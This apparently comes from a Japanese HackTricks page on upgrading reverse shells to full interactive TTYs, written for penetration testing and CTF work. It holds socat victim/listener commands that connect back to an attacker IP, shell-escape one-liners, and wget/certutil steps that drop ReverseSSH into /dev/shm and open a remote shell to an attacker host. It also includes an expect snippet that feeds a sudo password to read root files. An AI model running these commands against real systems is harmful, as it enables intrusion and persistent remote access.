# フルTTY

## フルTTY

`/etc/shells` には有効な login-shell のパス名が記載されており、一部のプログラムから参照されますが、PTY の割り当てに必須となる普遍的な前提条件ではありません。<sup>[[3]](#references)[[4]](#references)</sup> `pkexec` などのプログラムが `SHELL` を `The value for the SHELL variable was not found in the /etc/shells file` として拒否する場合は、正確な shell のパス（例: `/bin/bash`）が `/etc/shells` に含まれていることを確認してください。<sup>[[10]](#references)</sup> 以下の `CTRL+Z`/`fg` による復旧シーケンスは Bash の job control を使用します。現在の shell が Bash でない場合は、このシーケンスを使用する前に Bash を起動してください。<sup>[[7]](#references)</sup>

#### Python

Python の `pty.spawn` は、現在のプロセスの標準入力、標準出力、標準エラーストリームに接続されたプログラムを起動し、このセッションで Bash に pseudo-terminal を提供します。<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> **`stty -a`**を実行すると、**`rows`**と**`columns`**の**数**を取得できます。`-a`は現在のターミナル設定をすべて表示します。このコマンドの出力はターミナル固有のため、現在のセッションで報告された値を使用してください。<sup>[[11]](#references)</sup>

#### script

`script` utilityはターミナルセッションを記録します。ここでは、`/dev/null`がtypescriptを破棄し、`-q`が開始メッセージと完了メッセージを抑制し、`-c`がデフォルトのshellの代わりにBashを実行します。<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
いずれかの PTY-spawn 方法を実行した後、Netcat セッションを一時停止し、ローカルの raw mode で復元してから、remote terminal の環境とサイズを設定します：
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

listenerは現在のterminalをrawモードで使用し、local echoを無効にして、port 4444でTCP接続を受け付けます。victimのcommandはptyを割り当て、stderrを結合し、sessionを作成し、SIGINTを転送して、適切なterminal設定を適用します。子プロセスにcontrolling terminalが必要な場合は、`ctty`を追加します。<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **shellの起動**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (old versions with `--interactive`): `!sh`

Nmapのescapeはversion固有です。Nmapは後のreleaseで`--interactive` modeを削除したため、`!sh`はold versionsにのみ適用されます。<sup>[[13]](#references)</sup>

## ReverseSSH

**interactive shell access**に加えて、**file transfers**や**port forwarding**にも便利な方法は、static linkされたssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)をtargetに配置することです。<sup>[[1]](#references)</sup>

以下は、projectが公開しているUPX-compressed binaryを使用した`x86`の例です。他のarchitectureやrelease artifactについては、[releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/)を案内として使用してください。<sup>[[1]](#references)</sup>

1. incoming SSH connectionを受け取れるようにlocal hostを準備します。listener modeでは、`-l`でlistenerを有効にし、`-p 4444`でtargetのconnectionを受け付けるportを選択します。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target。 同じ `upx_reverse-sshx86` artifact を `/dev/shm/reverse-ssh` に転送し、実行可能にします。target の `-p 4444` は上記の listener port を選択し、`kali@10.0.0.2` は home へ接続する際に使用する account と host を指定します。<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target。Full interactive PowerShell には Windows 10 build 17763 が必要です。詳細は[project README](https://github.com/Fahrj/reverse-ssh#features)を参照してください。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windowsの例では、`certutil`で`-f -urlcache`を使用します。Microsoftは`-f`をURLのfetchを強制するオプションとして文書化しており、使用可能なパラメータはversionによって異なるため、この形式が利用できない場合は`certutil -?`を確認してください。<sup>[[12]](#references)</sup>

- reverse connectionが成功すると、ReverseSSHのreverse-mode listenerはデフォルトでport `8888`（または`-b`で指定した値）をbindし、incoming connectionではデフォルトのpassword `letmeinbrudipls`を使用して任意のusernameを受け入れます。remote shellは`reverse-ssh(.exe)`を起動したaccountのprivilegesで実行されます。<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) は Unix-like reverse shell を自動的に PTY にアップグレードし、Unix-like terminal のサイズを変更し、shell interaction をログに記録します。Windows shell に対しては readline を提供しますが、real-time の terminal resizing には対応していません。<sup>[[2]](#references)</sup>

デフォルトでは `penelope` を `0.0.0.0:4444` で listen します。その後、受信した Unix-like shell は自動的にアップグレードされ、ログに記録されます。<sup>[[2]](#references)</sup>

## No TTY

何らかの理由で full TTY を取得できない場合でも、**ユーザー入力を要求する program と対話できます**。次の例では、Expect が `sudo` を spawn し、password prompt を待機して password を送信し、`interact` によって制御を返します。`sudo -S` は standard input から password を読み取ります。authorized lab でのみ使用し、実際の credential を shell history や source file に記録しないでください。<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTFなど向けのreverse shell機能を備えた静的リンクssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - 作業を容易にするためのいくつかの処理を自動化するshell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Pythonドキュメント](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap Change Log](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
